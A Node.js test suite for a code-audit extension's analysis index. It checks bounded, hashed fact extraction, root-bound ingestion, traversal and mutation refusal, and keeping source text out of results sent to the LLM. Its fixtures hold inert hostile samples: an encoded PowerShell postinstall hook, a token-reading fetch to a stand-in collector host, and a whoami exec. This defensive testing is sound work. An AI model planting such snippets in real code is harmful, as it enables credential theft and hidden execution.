import { afterEach, test } from "node:test";
import assert from "node:assert/strict";
import {
    mkdirSync,
    mkdtempSync,
    readFileSync,
    rmSync,
    symlinkSync,
    writeFileSync,
} from "node:fs";
import nodePath from "node:path";

import {
    extractFactsFromText,
} from "../analysis/extractFacts.mjs";
import {
    buildAnalysisIndexSnapshot,
    createAnalysisIndexState,
    recordIndexEnumeration,
    recordIndexedFile,
} from "../analysis/indexState.mjs";
import {
    __internals as enforcementInternals,
    activateAudit,
    deactivateAudit,
    getAnalysisIndexState,
    getAnalysisStageState,
    getIndexedSourceFile,
    listIndexedSourceFiles,
    recordResolvedClonePath,
    validateIndexedEvidenceReference,
} from "../enforcement.mjs";
import { __internals as apiInternals } from "../safeWrappers/apiClient.mjs";
import { safeFetchFileHandler } from "../safeWrappers/safeFetchHandler.mjs";
import { safeListTreeHandler } from "../safeWrappers/safeListTreeHandler.mjs";
import {
    safeIndexSourceFileHandler,
    safeListSourceHandler,
} from "../safeWrappers/sourceIngestion.mjs";
import { safeListAnalysisFactsHandler } from "../safeWrappers/analysisFactsWrapper.mjs";

const AUDIT_ID = "11111111-1111-4111-8111-111111111111";
const COMMIT = "a".repeat(40);
const ROOT_TREE = "b".repeat(40);
const BLOB = "c".repeat(40);
const scratchRoots = [];

function parse(result) {
    return JSON.parse(result.textResultForLlm);
}

function makeScratch(prefix) {
    const root = mkdtempSync(nodePath.join(process.cwd(), prefix));
    scratchRoots.push(root);
    return root;
}

afterEach(() => {
    enforcementInternals.activeAudits.clear();
    while (scratchRoots.length > 0) {
        rmSync(scratchRoots.pop(), { recursive: true, force: true });
    }
});

test("fact extraction produces bounded normalized facts without source excerpts", () => {
    const manifestSource = JSON.stringify({
        scripts: { postinstall: "powershell -EncodedCommand AAA" },
        activationEvents: ["onStartupFinished"],
        contributes: { commands: [{ command: "sample.run" }] },
        endpoint: "https://user:pass@api.example.com/baseline?q=secret#fragment",
    }, null, 2);
    const codeSource = [
        "import client from 'axios';",
        "export function collect() {",
        "  const secret = process.env.API_TOKEN;",
        "  child_process.exec('powershell -enc AAA');",
        "  return fetch('https://collector.example.net/upload?token=secret');",
        "}",
    ].join("\n");

    const manifest = extractFactsFromText({
        path: "package.json",
        text: manifestSource,
    });
    const code = extractFactsFromText({
        path: "src/index.mjs",
        text: codeSource,
    });
    const facts = [...manifest.facts, ...code.facts];
    const kinds = new Set(facts.map((fact) => fact.kind));

    for (const required of [
        "manifest-key",
        "config-key",
        "declaration",
        "import",
        "execution-registration",
        "command-construction",
        "url",
        "domain",
        "sensitive-resource",
        "source-hint",
        "sink-hint",
    ]) {
        assert.ok(kinds.has(required), `missing ${required}`);
    }
    assert.ok(facts.every((fact) => /^[a-f0-9]{64}$/.test(fact.excerptHash)));
    assert.ok(facts.every((fact) => Number.isInteger(fact.line) && fact.line >= 1));
    const serialized = JSON.stringify(facts);
    assert.doesNotMatch(serialized, /EncodedCommand AAA|token=secret|user:pass/);
    assert.doesNotMatch(serialized, /sourceText|excerptText|rawSource/);
    assert.match(serialized, /api\.example\.com/);
});

test("per-file fact overflow is bounded and keeps the index incomplete", () => {
    const state = createAnalysisIndexState({
        auditId: AUDIT_ID,
        sourceKind: "local-source",
    });
    const source = "const a=1;\nconst b=2;\nconst c=3;\nconst d=4;\nconst e=5;\n";
    recordIndexEnumeration(state, {
        entries: [{ path: "many.js", size: Buffer.byteLength(source) }],
        complete: true,
    });
    const extraction = extractFactsFromText({
        path: "many.js",
        text: source,
        maxFacts: 2,
    });
    assert.equal(extraction.overflow, true);
    recordIndexedFile(state, {
        path: "many.js",
        size: Buffer.byteLength(source),
        classification: "text",
        classificationComplete: true,
        contentSha256: "d".repeat(64),
        facts: extraction.facts,
        factsOverflow: extraction.overflow,
        lineCount: extraction.lineCount,
        invisibleUnicodeScanComplete: true,
    });
    const snapshot = buildAnalysisIndexSnapshot(state);
    assert.equal(snapshot.complete, false);
    assert.equal(snapshot.facts.total, 2);
    assert.equal(snapshot.facts.perFileOverflowCount, 1);
    assert.equal(snapshot.reads.statusCounts["index-overflow"], 1);
});

test("per-audit fact overflow is capped exactly and marks preparation incomplete", () => {
    const state = createAnalysisIndexState({
        auditId: AUDIT_ID,
        sourceKind: "local-source",
    });
    const source = Array.from(
        { length: 256 },
        (_, index) => `const symbol${index} = ${index};`,
    ).join("\n");
    const entries = Array.from({ length: 79 }, (_, index) => ({
        path: `src/file-${index}.js`,
        size: Buffer.byteLength(source),
    }));
    recordIndexEnumeration(state, { entries, complete: true });
    for (const entry of entries) {
        const extraction = extractFactsFromText({
            path: entry.path,
            text: source,
        });
        recordIndexedFile(state, {
            path: entry.path,
            size: entry.size,
            classification: "text",
            classificationComplete: true,
            contentSha256: "e".repeat(64),
            facts: extraction.facts,
            factsOverflow: extraction.overflow,
            lineCount: extraction.lineCount,
            invisibleUnicodeScanComplete: true,
        });
    }
    const snapshot = buildAnalysisIndexSnapshot(state);
    assert.equal(snapshot.complete, false);
    assert.equal(snapshot.facts.total, 20_000);
    assert.equal(snapshot.facts.auditOverflow, true);
    assert.ok(snapshot.reads.statusCounts["index-overflow"] >= 1);
});

test("mandatory API fetch indexes full text and advances acquired to prepared", async () => {
    const sessionId = "baseline-index-api";
    activateAudit({
        sessionId,
        buildPath: process.cwd(),
        mode: "audit_source",
        expectedClonePath: nodePath.join(process.cwd(), "unused-api-clone"),
        owner: "octocat",
        repo: "demo",
    });
    const text = "export function run() { return fetch('https://api.example.com/baseline'); }";
    const listed = await safeListTreeHandler(
        { owner: "octocat", repo: "demo" },
        {
            sessionId,
            apiClient: {
                resolveRefToSha:() => COMMIT,
                getCommitIdentity:() => ({
                    commitSha: COMMIT,
                    rootTreeSha: ROOT_TREE,
                }),
                listTreeBySha:() => ({
                    treeSha: ROOT_TREE,
                    recursive: true,
                    truncated: false,
                    entriesTruncated: false,
                    discoveryTruncated: false,
                    entries: [{
                        path: "src/index.mjs",
                        type: "blob",
                        sha: BLOB,
                        size: Buffer.byteLength(text),
                    }],
                    discoveredSubtrees: [],
                }),
            },
        },
    );
    assert.equal(listed.resultType, "success");

    const fetched = await safeFetchFileHandler(
        {
            owner: "octocat",
            repo: "demo",
            sha: COMMIT,
            path: "src/index.mjs",
            coverage_scope: "mandatory",
        },
        {
            sessionId,
            apiClient: {
                fetchFile:() => apiInternals.buildFetchResultFromBuffer(
                    "src/index.mjs",
                    Buffer.from(text),
                    { blobSha: BLOB },
                ),
            },
        },
    );
    assert.equal(fetched.resultType, "success");
    const body = parse(fetched);
    assert.equal(body.analysisIndex.complete, true);
    assert.equal(body.analysisStageState.current, "prepared");
    assert.ok(body.analysisFacts.some((fact) => fact.kind === "declaration"));
    assert.ok(body.analysisFacts.some((fact) => fact.kind === "url"));
    assert.equal(getAnalysisStageState(sessionId).current, "prepared");
    const declaration = body.analysisFacts.find((fact) => fact.kind === "declaration");
    const listedFiles = listIndexedSourceFiles(sessionId, {
        auditId: body.analysisStageState.auditId,
    });
    assert.equal(listedFiles.total, 1);
    const indexedFile = getIndexedSourceFile(sessionId, {
        auditId: body.analysisStageState.auditId,
        path: "src/index.mjs",
    });
    assert.equal(indexedFile.lineCount, 1);
    assert.equal(indexedFile.blobSha, BLOB);
    const verified = validateIndexedEvidenceReference(sessionId, {
        auditId: body.analysisStageState.auditId,
        path: "src/index.mjs",
        startLine: declaration.line,
        endLine: declaration.endLine,
        excerptHash: declaration.excerptHash,
        blobSha: BLOB,
        contentSha256: body.sha256,
    });
    assert.equal(verified.factId, declaration.id);
    const factPageResult = await safeListAnalysisFactsHandler(
        {
            audit_id: body.analysisStageState.auditId,
            kind: "declaration",
        },
        { sessionId },
    );
    assert.equal(factPageResult.resultType, "success");
    const factPage = parse(factPageResult);
    assert.equal(factPage.total, 1);
    assert.equal(factPage.facts[0].id, declaration.id);
    assert.doesNotMatch(factPageResult.textResultForLlm, /export function run/);
    assert.throws(() => validateIndexedEvidenceReference(sessionId, {
            auditId: body.analysisStageState.auditId,
            path: "src/index.mjs",
            startLine: 1,
            endLine: 2,
            excerptHash: declaration.excerptHash,
            blobSha: BLOB,
        }),
        /outside indexed bounds/,
    );

    const state = getAnalysisIndexState(sessionId);
    assert.equal(state.facts.length, body.analysisFacts.length);
    assert.doesNotMatch(JSON.stringify(state), /export function run/);
    deactivateAudit(sessionId);
});

test("empty pinned trees prepare without fabricating file facts", async () => {
    const sessionId = "baseline-index-empty-api";
    activateAudit({
        sessionId,
        buildPath: process.cwd(),
        mode: "audit_source",
        expectedClonePath: nodePath.join(process.cwd(), "unused-empty-clone"),
        owner: "octocat",
        repo: "empty",
    });
    const listed = await safeListTreeHandler(
        { owner: "octocat", repo: "empty" },
        {
            sessionId,
            apiClient: {
                resolveRefToSha:() => COMMIT,
                getCommitIdentity:() => ({
                    commitSha: COMMIT,
                    rootTreeSha: ROOT_TREE,
                }),
                listTreeBySha:() => ({
                    treeSha: ROOT_TREE,
                    recursive: true,
                    truncated: false,
                    entriesTruncated: false,
                    discoveryTruncated: false,
                    entries: [],
                    discoveredSubtrees: [],
                }),
            },
        },
    );
    assert.equal(listed.resultType, "success");
    const body = parse(listed);
    assert.equal(body.analysisIndex.complete, true);
    assert.equal(body.analysisIndex.facts.total, 0);
    assert.equal(body.analysisStageState.current, "prepared");
});

test("local ingestion is exact-root-bound, non-executing, source-text-free, and quantitative", async (t) => {
    const sourceRoot = makeScratch(".zt-local-");
    const buildRoot = makeScratch(".zt-buildroot-");
    mkdirSync(nodePath.join(sourceRoot, "src"), { recursive: true });
    const secretText = "const stolen = process.env.SECRET; child_process.exec('cmd.exe /c whoami');";
    writeFileSync(nodePath.join(sourceRoot, "src", "main.js"), secretText);
    writeFileSync(
        nodePath.join(sourceRoot, "payload.bin"),
        Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 1, 2, 3]),
    );
    let symlinkCreated = false;
    try {
        symlinkSync(
            nodePath.join(sourceRoot, "src"),
            nodePath.join(sourceRoot, "linked-src"),
            process.platform === "win32" ? "junction": "dir",
        );
        symlinkCreated = true;
    } catch (err) {
        if (!["EPERM", "EACCES", "UNKNOWN"].includes(err?.code)) throw err;
        t.diagnostic(`symlink creation unavailable: ${err.code}`);
    }

    const sessionId = "baseline-index-local";
    activateAudit({
        sessionId,
        buildPath: buildRoot,
        mode: "audit_local_source",
        localPath: sourceRoot,
        expectedReportPath: nodePath.join(
            buildRoot,
            "_reports",
            `local-${nodePath.basename(sourceRoot).toLowerCase()}-20260714000000`,
        ),
    });

    const listed = await safeListSourceHandler({}, { sessionId });
    assert.equal(listed.resultType, "success");
    const listBody = parse(listed);
    assert.equal(listBody.sourceRoot, nodePath.resolve(sourceRoot));
    assert.equal(listBody.totalFiles, 2);
    assert.equal(listBody.analysisIndex.enumeration.complete, true);
    if (symlinkCreated) {
        assert.equal(listBody.analysisIndex.enumeration.reparsePointsSkipped, 1);
    }

    const traversal = await safeIndexSourceFileHandler(
        { path: "../outside.txt" },
        { sessionId },
    );
    assert.equal(traversal.resultType, "failure");

    for (const entry of listBody.entries) {
        const indexed = await safeIndexSourceFileHandler(
            { path: entry.path },
            { sessionId },
        );
        assert.equal(indexed.resultType, "success");
        assert.doesNotMatch(indexed.textResultForLlm, /const stolen|whoami/);
    }
    const finalList = parse(await safeListSourceHandler({}, { sessionId }));
    assert.equal(finalList.analysisIndex.complete, true);
    assert.equal(finalList.analysisIndex.reads.indexedTextFiles, 1);
    assert.equal(finalList.analysisIndex.reads.classifiedBinaryFiles, 1);
    assert.equal(finalList.analysisStageState.current, "prepared");
});

test("build ingestion reads only the exact recorded clone", async () => {
    const buildRoot = makeScratch(".zt-build-");
    const cloneRoot = nodePath.join(buildRoot, "recorded-clone");
    mkdirSync(cloneRoot, { recursive: true });
    writeFileSync(nodePath.join(cloneRoot, "build.js"), "export const build = () => 1;");
    const sibling = nodePath.join(buildRoot, "sibling-clone");
    mkdirSync(sibling, { recursive: true });
    writeFileSync(nodePath.join(sibling, "outside.js"), "throw new Error('not indexed');");

    const sessionId = "baseline-index-build";
    activateAudit({
        sessionId,
        buildPath: buildRoot,
        mode: "audit_and_safe_build",
        expectedClonePath: cloneRoot,
        owner: "octocat",
        repo: "demo",
    });
    assert.equal(recordResolvedClonePath(sessionId, cloneRoot), true);
    assert.equal(recordResolvedClonePath(sessionId, sibling), false);

    const listed = parse(await safeListSourceHandler({}, { sessionId }));
    assert.equal(listed.sourceRoot, nodePath.resolve(cloneRoot));
    assert.deepEqual(listed.entries.map((entry) => entry.path), ["build.js"]);
    const indexed = parse(await safeIndexSourceFileHandler(
        { path: "build.js" },
        { sessionId },
    ));
    assert.equal(indexed.analysisIndex.complete, true);
    assert.equal(indexed.analysisStageState.current, "prepared");
    assert.doesNotMatch(JSON.stringify(getAnalysisIndexState(sessionId)), /outside\.js/);
});

test("on-disk ingestion refuses unbound/API roots and detects post-enumeration mutation", async () => {
    const buildRoot = makeScratch(".zt-refuse-");
    const localRoot = makeScratch(".zt-mutate-");
    writeFileSync(nodePath.join(localRoot, "mutable.js"), "const before = 1;");

    activateAudit({
        sessionId: "baseline-index-api-refuse",
        buildPath: buildRoot,
        mode: "audit_source",
        expectedClonePath: nodePath.join(buildRoot, "unused"),
        owner: "octocat",
        repo: "demo",
    });
    const apiRefusal = await safeListSourceHandler(
        {},
        { sessionId: "baseline-index-api-refuse" },
    );
    assert.equal(apiRefusal.resultType, "failure");
    assert.match(apiRefusal.textResultForLlm, /does not use wrapper-controlled on-disk/);

    activateAudit({
        sessionId: "baseline-index-build-unbound",
        buildPath: buildRoot,
        mode: "audit_and_safe_build",
        expectedClonePath: nodePath.join(buildRoot, "not-cloned"),
        owner: "octocat",
        repo: "demo",
    });
    const unbound = await safeListSourceHandler(
        {},
        { sessionId: "baseline-index-build-unbound" },
    );
    assert.equal(unbound.resultType, "failure");
    assert.match(unbound.textResultForLlm, /safe_clone first/);

    const sessionId = "baseline-index-mutation";
    activateAudit({
        sessionId,
        buildPath: buildRoot,
        mode: "audit_local_source",
        localPath: localRoot,
        expectedReportPath: nodePath.join(
            buildRoot,
            "_reports",
            "local-mutation-20260714000000",
        ),
    });
    assert.equal(
        (await safeListSourceHandler({}, { sessionId })).resultType,
        "success",
    );
    writeFileSync(nodePath.join(localRoot, "mutable.js"), "const after = 123456789;");
    const changed = await safeIndexSourceFileHandler(
        { path: "mutable.js" },
        { sessionId },
    );
    assert.equal(changed.resultType, "failure");
    assert.match(changed.textResultForLlm, /size changed after enumeration/);
    assert.equal(getAnalysisStageState(sessionId).current, "acquired");
});

test("extension registers the wrapper-controlled on-disk ingestion tools", () => {
    const extensionSource = readFileSync(
        new URL("../extension.mjs", import.meta.url),
        "utf8",
    );
    assert.match(extensionSource, /\bsafeListSourceHandler\b/);
    assert.match(extensionSource, /\bsafeIndexSourceFileHandler\b/);
    assert.match(extensionSource, /name:\s*"zerotrust_safe_list_source"/);
    assert.match(extensionSource, /name:\s*"zerotrust_safe_index_source_file"/);
    assert.match(extensionSource, /\bsafeListAnalysisFactsHandler\b/);
    assert.match(extensionSource, /name:\s*"zerotrust_safe_list_analysis_facts"/);
    assert.match(extensionSource, /never return source text|returns no source text/i);
});
